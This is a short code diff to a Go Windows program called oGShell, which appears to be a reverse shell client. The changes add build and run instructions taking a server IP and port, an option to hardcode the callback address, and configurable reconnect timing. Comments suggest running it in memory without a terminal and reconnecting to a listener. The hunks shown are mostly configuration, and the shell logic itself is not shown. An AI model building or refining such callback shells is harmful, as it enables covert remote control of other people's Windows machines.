@@ -1,7 +1,10 @@
 //go:build windows
 
 /*
+To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
 GOOS=windows GOARCH=amd64 go build -o oGShell.exe cmd/windows/main.go
+run with
+oGShell.exe <serverIP> <serverPort>
 */
 package main
 
@@ -16,8 +19,19 @@ import (
 	"time"
 )
 
+/*
+Global Variables to possibly change
+
+		Useful if you want to run the program in memory or don't have a terminal
+	Change the server IP and server port if you would like to hardcode them
+		Useful if you accidentally hit control C and end the process, now you can reconnect by just restarting the listener
+	Change the retry duration to set how long the program will continue running once the connection has dropped
+	Change the retry interval to set how often the program will attempt to reconnect during the retry duration
+*/
 var serverIP = ""
 var serverPort = ""
+var retryDuration = 5 * time.Minute
+var retryInterval = 10 * time.Second
 
 const CREATE_NEW_PROCESS_GROUP = 0x00000200
 
@@ -145,8 +159,6 @@ func main() {
 		return
 	}
 
-	retryDuration := 5 * time.Minute
-	retryInterval := 10 * time.Second
 	deadline := time.Now().Add(retryDuration)
 
 	for time.Now().Before(deadline) {
